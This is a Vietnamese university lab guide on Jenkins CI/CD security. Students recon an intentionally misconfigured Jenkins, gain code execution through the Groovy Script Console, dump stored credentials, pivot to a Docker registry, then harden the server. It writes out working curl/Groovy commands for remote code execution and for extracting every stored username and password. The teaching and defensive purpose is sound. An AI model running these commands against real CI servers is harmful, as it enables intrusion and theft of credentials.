# HƯỚNG DẪN THỰC HÀNH — Bảo mật CI/CD Pipeline (Jenkins)

**Học viện Công nghệ Bưu chính Viễn thông — SecLab PTIT**

`Mức độ: Nâng cao`  ·  `Phân loại: DevSecOps / CI-CD Security`  ·  `OWASP CI/CD Top 10`  ·  `MITRE ATT&CK: T1078, T1059`

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `dso-cicd-jenkins` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `curl`, `jq`, `grep`, trình duyệt/CLI gọi Jenkins REST API & Script Console, `jenkins-cli.jar` (tùy chọn), `git`/`docker` client để pivot |
| **Kiến thức yêu cầu** | Hiểu HTTP request/response và Basic Auth; biết cú pháp `curl` cơ bản; hiểu khái niệm CI/CD pipeline và build job; đọc được cú pháp Groovy đơn giản (bài đã nhắc lại đủ ở mục 3, không cần làm bài khác trước) |

**Mục tiêu học tập**
- Hiểu vì sao máy chủ CI (Jenkins) là mục tiêu giá trị cao: nó nắm giữ credential để truy cập source code, registry và hạ tầng triển khai.
- Nắm được chuỗi tấn công điển hình vào Jenkins cấu hình sai: truy cập ẩn danh → RCE qua Script Console → trích xuất secret → pivot sang tài nguyên khác.
- Hiểu cơ chế phân quyền (authorization) của Jenkins và cách Script Console (Groovy) trở thành đường dẫn tới thực thi mã tùy ý (RCE).
- Nhận diện các kiểu lộ lọt credential trong CI: hardcode trong job, in ra build log, đặt trong biến môi trường.
- Áp dụng tư duy DevSecOps để hardening một Jenkins instance đúng chuẩn tối thiểu.

**Kỹ năng đạt được**
- Kỹ năng trinh sát một dịch vụ CI qua REST API (`/api/json`, `/whoAmI`, liệt kê job/plugin) mà không cần đăng nhập.
- Kỹ năng khai thác Script Console để thực thi lệnh hệ thống (RCE) và trích xuất credential được lưu trong Jenkins.
- Kỹ năng săn secret trong build log và biến môi trường của job.
- Kỹ năng pivot: dùng credential đánh cắp để xác thực với dịch vụ khác (registry/repo nội bộ) và lấy được dữ liệu mục tiêu.
- Kỹ năng cấu hình phòng thủ Jenkins: bật xác thực + Matrix Authorization, khóa Script Console, quản lý secret bằng Credentials Plugin, che (mask) log.

---

## 2. Kịch bản

**Tình huống**

Sinh viên đóng vai một **attacker/red-teamer** đã có chỗ đứng trong mạng nội bộ của công ty "ACME DevOps". Trong quá trình rà quét, sinh viên phát hiện một máy chủ **Jenkins** (`172.60.2.10:8080`) — trái tim của quy trình build/deploy. Đội vận hành đã cấu hình sai: Jenkins **cho phép truy cập ẩn danh gần như toàn quyền** (không bắt đăng nhập), **Script Console vẫn mở**, và các job build **để lộ credential** (hardcode/biến môi trường/in ra log). Từ Jenkins, kẻ tấn công có thể thực thi mã tùy ý trên máy CI, đánh cắp credential dùng để đẩy image, rồi **pivot** sang một **registry nội bộ** (`172.60.2.20:5000`) để lấy dữ liệu bí mật.

Sau khi hoàn tất khai thác, sinh viên chuyển vai **DevSecOps engineer** và phải **hardening** Jenkins để chuỗi tấn công không còn tái diễn.

**Vai trò của sinh viên**
- Trên máy `client` (attacker), trinh sát Jenkins qua REST API mà không cần credential: xác định phiên bản, quyền hiện tại, danh sách job và plugin.
- Lợi dụng cấu hình sai để đạt RCE qua Script Console (Groovy) trên máy CI.
- Trích xuất credential từ Jenkins (build log, biến môi trường job, kho credential nội bộ) và lấy flag đầu tiên trên máy CI.
- Dùng credential đánh cắp để pivot sang registry nội bộ và lấy flag thứ hai.
- Cuối cùng: hardening Jenkins và chứng minh cấu hình sai đã được khắc phục.

**Sơ đồ mạng**

```
        Mạng ảo Labtainer (172.60.2.0/24)

  +------------------------+           +----------------------------+
  |      client            |           |         jenkins            |
  |   (máy attacker)       |  HTTP     |   Jenkins CI (cổng 8080)   |
  |  curl / jq / git       |---------->|   - Anonymous full access  |
  |  docker client         |  8080     |   - Script Console (Groovy)|
  |  jenkins-cli.jar       |           |   - job "build-app"        |
  |   172.60.2.30          |           |   - build log + creds      |
  +-----------+------------+           |     172.60.2.10            |
              |                        +--------------+-------------+
              |                                       | (credential lộ ra
              |  docker/registry API (pivot)          |  từ máy CI)
              |  5000                                 v
              |                        +----------------------------+
              +----------------------->|        registry            |
                                       |  Docker Registry v2 (5000) |
                                       |  - HTTP Basic Auth         |
                                       |  - image chứa flag pivot   |
                                       |     172.60.2.20            |
                                       +----------------------------+

  Luồng tấn công:
  client --recon REST--> jenkins --Script Console RCE--> flag_ci
         --trích credential--> dùng creds --pivot--> registry --> flag_pivot
  Luồng phòng thủ:
  client (vai DevSecOps) --> hardening jenkins (auth + matrix + tắt console + creds plugin)
```

---

## 3. Kiến thức bổ trợ

### Kiến thức nền tảng

- **CI/CD & máy chủ CI (Jenkins):** CI/CD (Continuous Integration / Continuous Delivery) là quy trình tự động build, kiểm thử và triển khai phần mềm. **Jenkins** là một máy chủ CI phổ biến, tổ chức công việc thành các **job/pipeline**. Vì phải tự động kéo source, build image và đẩy lên registry/triển khai hạ tầng, Jenkins **lưu trữ rất nhiều credential** (token Git, tài khoản registry, khóa SSH, secret cloud). Chiếm được Jenkins thường tương đương chiếm được cả chuỗi cung ứng phần mềm — đây là lý do CI là mục tiêu giá trị cao (OWASP CI/CD-SEC-1, CI/CD-SEC-4, CI/CD-SEC-6).

- **Authorization cấu hình sai (Misconfigured Authorization):** Jenkins tách **Authentication** (bạn là ai) và **Authorization** (bạn được làm gì). Một số cài đặt nguy hiểm: chọn "Anyone can do anything" hoặc trao quyền `Overall/Read`, `Overall/Administer` cho người dùng **Anonymous**; hoặc bật **cho phép đăng ký tài khoản mở** (allow users to sign up). Hậu quả: người chưa đăng nhập vẫn xem/điều khiển được Jenkins (ánh xạ MITRE ATT&CK **T1078 - Valid Accounts**, ở đây là "tài khoản ẩn danh hợp lệ").

- **Script Console (Groovy) → RCE:** Jenkins cung cấp một **Script Console** tại `/script` cho phép chạy mã **Groovy** trực tiếp trong tiến trình Jenkins với quyền của tài khoản chạy Jenkins. Groovy có thể gọi ra shell (`"cmd".execute()`) hoặc đọc thẳng kho credential nội bộ. Nếu console mở cho người có quyền thấp/ẩn danh, đây là **Remote Code Execution** hoàn chỉnh (MITRE ATT&CK **T1059 - Command and Scripting Interpreter**).

- **Lộ lọt secret trong CI:** Ba kiểu phổ biến — (1) **hardcode** thẳng trong định nghĩa job/pipeline; (2) in ra **build log** (ví dụ `echo $PASSWORD`, hoặc `docker login -p ...` để lệnh hiển thị mật khẩu); (3) đặt trong **biến môi trường** của job mà ai đọc được job cũng thấy. Secret nên được quản lý qua **Credentials Plugin** và được **mask** khỏi log.

- **Pivot bằng Valid Accounts:** Sau khi có credential của registry/repo, kẻ tấn công dùng chính credential đó để xác thực với dịch vụ khác — đây là *lateral movement* dùng tài khoản hợp lệ, rất khó phát hiện vì lưu lượng trông "bình thường".

- **Hardening (DevSecOps):** Nguyên tắc least-privilege cho CI: bắt buộc xác thực, dùng **Matrix Authorization** để cấp quyền tối thiểu, thu hồi mọi quyền của Anonymous, **tắt/giới hạn Script Console**, chuyển secret sang Credentials Plugin và mask log.

### Thành phần cần quan sát trong bài lab

| Thành phần | Vai trò |
|---|---|
| Jenkins REST API (`/api/json`, `/whoAmI/api/json`) | Điểm trinh sát: cho biết phiên bản, quyền của phiên hiện tại (kể cả ẩn danh), danh sách job/plugin. Nếu ẩn danh đọc được → dấu hiệu authorization cấu hình sai. |
| Script Console (`/script` + `/scriptText`) | Điểm khai thác RCE: chạy Groovy tùy ý → thực thi lệnh OS và đọc credential store. |
| Job `build-app` (config, build log, env) | Nơi credential bị lộ: hardcode trong config, in ra console log của build, hoặc nằm trong biến môi trường job. |
| Jenkins Credentials Store | Kho credential nội bộ; qua RCE có thể liệt kê và giải mã secret đang lưu. |
| `flag_ci.txt` (trên máy jenkins) | Flag thứ nhất, đọc được sau khi đạt RCE trên máy CI. |
| Docker Registry v2 (`registry:5000`) | Đích pivot; yêu cầu HTTP Basic Auth bằng chính credential đánh cắp từ Jenkins. |
| Image/blob chứa `flag_pivot` | Flag thứ hai, lấy được sau khi xác thực thành công với registry bằng credential đánh cắp. |

### Bảng công cụ & cú pháp sử dụng trong bài

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `curl` | `curl -s http://<IP>:8080/api/json?pretty=true` | Gọi Jenkins REST API, xem thông tin instance & danh sách job (dạng JSON). |
| `curl` | `curl -s http://<IP>:8080/whoAmI/api/json` | Kiểm tra danh tính & quyền của phiên hiện tại (phát hiện truy cập ẩn danh). |
| `curl` | `curl -sI http://<IP>:8080/` | Xem HTTP header, đọc `X-Jenkins:` để lấy phiên bản Jenkins. |
| `curl` | `curl -s --data-urlencode "script=<GROOVY>" http://<IP>:8080/scriptText` | Gửi mã Groovy tới Script Console và nhận kết quả text (RCE). |
| `curl` | `curl -s http://<IP>:8080/job/<job>/<n>/consoleText` | Tải build log (console output) của lần build số `<n>` để săn secret. |
| `curl` | `curl -s http://<IP>:8080/job/<job>/config.xml` | Đọc định nghĩa job (tìm secret hardcode). |
| `jq` | `... \| jq '.jobs[].name'` | Lọc/nhìn nhanh JSON trả về từ REST API. |
| `grep` | `grep -Ei 'pass\|pwd\|token\|secret\|user'` | Lọc credential trong log/output. |
| `jenkins-cli.jar` (tùy chọn) | `java -jar jenkins-cli.jar -s http://<IP>:8080/ groovy =` | Cách thay thế để chạy Groovy nếu HTTP endpoint bị giới hạn. |
| `curl` (registry) | `curl -s -u <user>:<pass> http://<IP>:5000/v2/_catalog` | Xác thực với Docker Registry v2 và liệt kê repository (pivot). |
| `curl` (registry) | `curl -s -u <user>:<pass> http://<IP>:5000/v2/<repo>/tags/list` | Liệt kê tag của một image trên registry. |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/ptit2026/pen_lab_2026/raw/refs/heads/main/dso-cicd-jenkins.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer dso-cicd-jenkins
```

*(Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)*

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho máy tấn công: `client`.

---

### Nhiệm vụ 1 — `recon_jenkins`: Trinh sát Jenkins & phát hiện authorization cấu hình sai

**Mục tiêu:** Xác định phiên bản Jenkins, kiểm tra quyền của phiên ẩn danh, và liệt kê job/plugin — tất cả **không cần đăng nhập** — để khẳng định lỗ hổng authorization.

**Bước 1:** Lấy phiên bản Jenkins qua HTTP header:
```bash
curl -sI http://172.60.2.10:8080/ | grep -i "X-Jenkins"
```

**Bước 2:** Kiểm tra danh tính/quyền của phiên hiện tại (chưa đăng nhập). Nếu trả về thông tin thay vì lỗi 403 → truy cập ẩn danh đang được bật:
```bash
curl -s http://172.60.2.10:8080/whoAmI/api/json | jq
```

**Bước 3:** Liệt kê thông tin instance và danh sách job qua REST API:
```bash
curl -s "http://172.60.2.10:8080/api/json?pretty=true" | jq '.jobs[]?.name'
```

**Bước 4:** Ghi lại tên job phát hiện được (ví dụ `build-app`) để khai thác ở các nhiệm vụ sau.

**Điều kiện hoàn thành nhiệm vụ:** Sinh viên lấy được chuỗi phiên bản Jenkins từ header `X-Jenkins`, và truy vấn REST API thành công **ở trạng thái ẩn danh** để liệt kê được ít nhất một job (kết quả recon được lưu vào file, ví dụ `~/recon.txt`, dùng để chấm điểm).

**Câu hỏi 1:** Việc một người dùng **chưa đăng nhập** vẫn đọc được danh sách job và thông tin instance qua REST API nói lên cấu hình authorization nào đang sai? Trong Jenkins, đâu là khác biệt giữa *Authentication* và *Authorization*, và cấu hình nào đã bị bật để dẫn tới tình trạng này?

Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `rce_script_console`: RCE qua Script Console và lấy flag trên máy CI

**Mục tiêu:** Lợi dụng Script Console để thực thi lệnh hệ thống trên máy `jenkins`, chứng minh RCE và đọc flag thứ nhất.

**Bước 1:** Kiểm tra endpoint Script Console có truy cập được ở trạng thái ẩn danh không:
```bash
curl -sI http://172.60.2.10:8080/script | head -n 1
```

**Bước 2:** Thực thi một lệnh Groovy đơn giản để xác nhận RCE (in danh tính tiến trình Jenkins):
```bash
curl -s --data-urlencode 'script=println "whoami=" + "id".execute().text' \
  http://172.60.2.10:8080/scriptText
```

**Bước 3:** Dùng RCE để tìm và đọc flag trên máy CI:
```bash
curl -s --data-urlencode 'script=println "find / -name flag_ci.txt 2>/dev/null".execute().text' \
  http://172.60.2.10:8080/scriptText

curl -s --data-urlencode 'script=println new File("<ĐƯỜNG_DẪN_FLAG>").text' \
  http://172.60.2.10:8080/scriptText
```

**Bước 4:** Lưu lại nội dung `flag_ci` vào file trên máy `client`:
```bash
curl -s --data-urlencode 'script=println new File("<ĐƯỜNG_DẪN_FLAG>").text' \
  http://172.60.2.10:8080/scriptText | tee ~/flag_ci.txt
```

**Điều kiện hoàn thành nhiệm vụ:** Lệnh Groovy trả về kết quả thực thi trên máy `jenkins` (chứng minh RCE), và nội dung `flag_ci` đúng định dạng flag được lưu trên máy `client`.

**Câu hỏi 2:** Vì sao Script Console lại tương đương với **RCE toàn quyền** trên máy CI? Mã Groovy chạy dưới quyền của tiến trình nào, và điều đó có ý nghĩa gì với các credential mà Jenkins đang nắm giữ?

Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `harvest_creds`: Trích xuất credential từ log, biến môi trường và credential store

**Mục tiêu:** Săn credential bị lộ trong CI theo cả ba đường (build log, biến môi trường job, kho credential nội bộ) để chuẩn bị cho bước pivot.

**Bước 1:** Tải build log của job và lọc secret in ra console:
```bash
curl -s "http://172.60.2.10:8080/job/build-app/lastBuild/consoleText" \
  | grep -Ei 'pass|pwd|token|secret|user|login|registry'
```

**Bước 2:** Đọc định nghĩa job để tìm secret hardcode hoặc biến môi trường:
```bash
curl -s "http://172.60.2.10:8080/job/build-app/config.xml" \
  | grep -Ei 'password|token|secret|env|credential'
```

**Bước 3:** Dùng RCE (từ Nhiệm vụ 2) liệt kê và giải mã credential trong Jenkins Credentials Store bằng Groovy:
```bash
curl -s --data-urlencode 'script=
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null).each {
  println "ID=" + it.id + " USER=" + it.username + " PASS=" + it.password
}' http://172.60.2.10:8080/scriptText
```

**Bước 4:** Ghi lại cặp `username:password` của **registry** thu được (ví dụ `deployer:<...>`), lưu vào `~/creds.txt` để dùng ở Nhiệm vụ 4.

**Điều kiện hoàn thành nhiệm vụ:** Sinh viên trích xuất được cặp credential của registry (username + password) từ ít nhất một trong ba nguồn và lưu ra `~/creds.txt` đúng định dạng.

**Câu hỏi 3:** Trong ba nguồn lộ lọt (build log / biến môi trường job / credential store), nguồn nào **nguy hiểm nhất** đối với người chỉ có quyền đọc job (không có RCE), và vì sao in mật khẩu ra build log lại là lỗi thường gặp nhưng dễ khắc phục nhất?

Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `pivot_registry`: Pivot bằng credential đánh cắp và lấy flag mục tiêu

**Mục tiêu:** Dùng credential đánh cắp từ Jenkins để xác thực với **Docker Registry** nội bộ và lấy flag thứ hai.

**Bước 1:** Xác thực và liệt kê repository trên registry:
```bash
curl -s -u '<USER>:<PASS>' http://172.60.2.20:5000/v2/_catalog | jq
```

**Bước 2:** Liệt kê tag của image mục tiêu:
```bash
curl -s -u '<USER>:<PASS>' http://172.60.2.20:5000/v2/<repo>/tags/list | jq
```

**Bước 3:** Lấy manifest, rồi tải blob chứa flag (flag được nhúng trong một layer/label của image):
```bash
curl -s -u '<USER>:<PASS>' \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  http://172.60.2.20:5000/v2/<repo>/manifests/<tag>

curl -s -u '<USER>:<PASS>' \
  http://172.60.2.20:5000/v2/<repo>/blobs/<DIGEST> -o layer.tar
tar -xf layer.tar && grep -Rai 'FLAG' .
```

**Bước 4:** Lưu nội dung `flag_pivot` vào `~/flag_pivot.txt`.

**Điều kiện hoàn thành nhiệm vụ:** Xác thực thành công với registry bằng credential đánh cắp (không phải credential có sẵn trên `client`), và lấy được `flag_pivot` đúng định dạng, lưu ra `~/flag_pivot.txt`.

**Câu hỏi 4:** Đây là ví dụ của kỹ thuật MITRE ATT&CK **T1078 - Valid Accounts**. Vì sao pivot bằng credential hợp lệ lại khó bị phát hiện hơn so với khai thác một lỗ hổng phần mềm, và biện pháp nào (ví dụ credential riêng cho từng job, scope hẹp, xoay vòng token) giúp giảm thiệt hại khi CI bị chiếm?

Trả lời: _______________________________________

---

### Nhiệm vụ 5 — `harden_jenkins`: Hardening Jenkins (DevSecOps)

**Mục tiêu:** Chuyển vai DevSecOps engineer, khắc phục các cấu hình sai để toàn bộ chuỗi tấn công ở Nhiệm vụ 1–4 không còn thực hiện được.

> Ghi chú: Việc cấu hình có thể làm qua giao diện web Jenkins hoặc qua file cấu hình/CasC (Configuration as Code) tùy cách lab dựng. Các bước dưới đây mô tả kết quả cần đạt; sinh viên thực hiện và sau đó **kiểm chứng lại bằng lệnh**.

**Bước 1 — Bật xác thực & Matrix Authorization, thu hồi quyền Anonymous:**
- Đặt Security Realm dùng cơ sở dữ liệu người dùng của Jenkins, **tắt "allow users to sign up"**.
- Chuyển Authorization sang **Matrix-based security**, xóa mọi quyền của người dùng `Anonymous` (đặc biệt `Overall/Read`, `Overall/Administer`, `Job/*`).

**Bước 2 — Tắt/giới hạn Script Console:** vô hiệu hóa hoặc chặn truy cập endpoint `/script`, `/scriptText` với mọi tài khoản không phải admin (ví dụ đặt quyền `Overall/RunScripts` chỉ cho admin).

**Bước 3 — Quản lý secret đúng cách:**
- Gỡ mọi secret hardcode khỏi `config.xml`/pipeline; chuyển sang **Credentials Plugin** và tham chiếu bằng `credentials()` binding.
- Bảo đảm secret **bị mask** trong build log (không `echo` mật khẩu; dùng `docker login --password-stdin`).

**Bước 4 — Kiểm chứng đã khắc phục.** Lặp lại các lệnh recon/khai thác cũ và xác nhận chúng bị chặn:
```bash
# Kỳ vọng: 403/401, KHÔNG còn trả JSON job cho ẩn danh
curl -s -o /dev/null -w "%{http_code}\n" http://172.60.2.10:8080/api/json

# Kỳ vọng: 403/401, Script Console không còn RCE ẩn danh
curl -s -o /dev/null -w "%{http_code}\n" \
  --data-urlencode 'script=println "id".execute().text' \
  http://172.60.2.10:8080/scriptText

# Kỳ vọng: build log không còn lộ password (không có dòng khớp)
curl -s "http://172.60.2.10:8080/job/build-app/lastBuild/consoleText" \
  | grep -Ei 'pass|pwd|token' || echo "OK: log da duoc mask"
```

**Điều kiện hoàn thành nhiệm vụ:** Sau hardening, truy vấn REST API và `scriptText` ở trạng thái ẩn danh trả về mã lỗi 401/403 (không còn liệt kê job, không còn RCE), và build log không còn chuỗi credential dạng rõ. Ghi kết quả kiểm chứng ra `~/harden_verify.txt`.

**Câu hỏi 5:** Trong chuỗi 4 lỗ hổng đã khai thác (anonymous access → Script Console RCE → secret lộ → pivot), theo sinh viên biện pháp hardening nào có **hiệu quả chi phí cao nhất** (chặn được nhiều bước nhất với ít thay đổi nhất)? Giải thích theo nguyên tắc least-privilege và defense-in-depth.

Trả lời: _______________________________________

---

## 5. Ghi chú triển khai (cho người xây lab)

**Container cần dựng (khai báo trong `start.config`, mạng `172.60.2.0/24`):**

| Container | IP | Vai trò | Dịch vụ chính |
|---|---|---|---|
| `client` | 172.60.2.30 | Máy attacker, nơi sinh viên gõ lệnh | `curl`, `jq`, `grep`, `tar`, `git`, `openjdk-jre` (cho `jenkins-cli.jar`), `docker`-CLI hoặc `skopeo` (tùy chọn cho pivot) |
| `jenkins` | 172.60.2.10 | Máy CI mục tiêu | Jenkins (cổng 8080) hoặc bản mô phỏng nhẹ (xem trade-off) |
| `registry` | 172.60.2.20 | Đích pivot | Docker Registry v2 (cổng 5000) + Basic Auth (htpasswd) |

**Flag/goal dự kiến:**
- `flag_ci` — file trên máy `jenkins`, chỉ đọc được sau RCE (Nhiệm vụ 2). Nên tham số hóa theo mã sinh viên.
- `flag_pivot` — nhúng trong layer/label của image trên `registry`, lấy được sau khi xác thực bằng credential đánh cắp (Nhiệm vụ 4).
- Goals gợi ý cho chấm tự động: `recon_jenkins`, `rce_script_console` (so khớp `flag_ci`), `harvest_creds` (so khớp cặp user:pass registry), `pivot_registry` (so khớp `flag_pivot`), `harden_jenkins` (kiểm tra mã HTTP 401/403 và vắng mặt chuỗi secret trong log — có thể chấm qua artifact `harden_verify.txt` hoặc script hậu kiểm chạy lại các curl trên).

**Trade-off tài nguyên: Jenkins thật vs. mô phỏng nhẹ (ĐIỂM CẦN CÂN NHẮC KHI TRIỂN KHAI):**

- **Phương án A — Jenkins thật (LTS, ảnh `jenkins/jenkins:lts`):** Bám sát thực tế nhất; Script Console, Credentials Plugin, REST API, CasC đều là hành vi thật, giá trị học tập cao. Nhược điểm: ảnh nặng (~500 MB+), cần JVM, RAM đề xuất ≥1–1.5 GB cho riêng container này, thời gian khởi động lâu; cần chuẩn bị sẵn cấu hình sai qua **JCasC** (Jenkins Configuration as Code) + init Groovy để tạo trạng thái anonymous-full-access, job `build-app` với secret lộ, và credential store có sẵn cặp registry. **Khuyến nghị nếu VM Labtainer đủ tài nguyên** — đây là phương án cho trải nghiệm chuẩn nhất.

- **Phương án B — Mô phỏng nhẹ (giả lập endpoint):** Dựng một HTTP server nhẹ (Python Flask/`http.server`) trả về đúng các endpoint dễ tổn thương: `/api/json`, `/whoAmI/api/json`, header `X-Jenkins`, `/scriptText` (thực sự chạy lệnh shell nhận từ tham số `script` để mô phỏng RCE, hoặc chỉ nhận Groovy mẫu và trả kết quả tương ứng), `/job/build-app/.../consoleText`, `/job/build-app/config.xml`. Ưu điểm: nhẹ (chỉ vài chục MB), khởi động nhanh, dễ tham số hóa flag theo sinh viên, dễ chấm điểm. Nhược điểm: kém "thật" hơn — Groovy chỉ được xử lý ở mức mẫu, sinh viên không thấy đúng thông báo lỗi Jenkins thật; phần hardening (Matrix Authorization, tắt Script Console) phải mô phỏng bằng cách chuyển server sang chế độ "đã vá" (trả 401/403). **Khuyến nghị nếu tài nguyên VM hạn chế** hoặc khi ưu tiên tốc độ khởi động và tính ổn định của chấm điểm.

- **Đề xuất mặc định:** Ưu tiên **Phương án A** cho tính chân thực; nếu benchmark cho thấy VM Labtainer chuẩn (thường 2–4 GB RAM tổng) không kham nổi đồng thời `jenkins` + `registry`, chuyển `jenkins` sang **Phương án B** và giữ `registry` là Docker Registry v2 thật (nhẹ, ~25 MB). Registry v2 nên dùng thật ở cả hai phương án vì rất nhẹ và cho trải nghiệm pivot chân thực.

- **Lưu ý khác:**
  - Toàn bộ credential, token, flag trong lab là **giả**, sinh ra bởi lab; không dùng dữ liệu thật.
  - `jenkins-cli.jar` chỉ là **tùy chọn** — nếu chọn Phương án B mà không mô phỏng CLI protocol, hãy ghi rõ trong đề rằng CLI không khả dụng và sinh viên dùng `curl` tới `/scriptText` (bài đã đặt curl là đường chính).
  - Nên tham số hóa flag và cặp credential registry theo mã sinh viên để chống chia sẻ đáp án.
  - Với pivot ở Nhiệm vụ 4, nếu không muốn phụ thuộc `docker` CLI trong container `client`, dùng thuần `curl` theo Registry HTTP API v2 như trong các bước (đã soạn theo hướng này) hoặc cài `skopeo` cho gọn.

---

## 6. Ánh xạ khung tham chiếu

| Khung | Mục liên quan |
|---|---|
| **OWASP CI/CD Security Top 10** | CICD-SEC-1 (Insufficient Flow Control), CICD-SEC-4 (Poisoned Pipeline Execution), CICD-SEC-6 (Insufficient Credential Hygiene), CICD-SEC-7 (Insecure System Configuration) |
| **MITRE ATT&CK** | T1078 - Valid Accounts (anonymous/stolen credentials, pivot); T1059 - Command and Scripting Interpreter (Groovy/Script Console RCE); T1552 - Unsecured Credentials (secret trong log/env/store) |
| **OWASP DevSecOps Guideline** | Secret management, least-privilege cho hệ thống CI, mask secret trong log |
